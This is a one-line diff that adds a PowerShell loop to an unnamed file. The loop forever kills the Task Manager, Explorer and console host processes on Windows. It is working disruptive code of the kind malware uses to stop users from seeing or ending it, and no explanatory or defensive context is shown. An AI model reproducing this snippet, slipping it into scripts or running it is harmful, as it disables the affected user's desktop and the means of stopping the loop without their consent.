@@ -1,0 +1,1 @@
+while ($TRUE) {Get-Process | Where-Object {$_.name -match "taskmgr|explorer|conhost"} | foreach-object {$_.kill()} 2>$NULL }
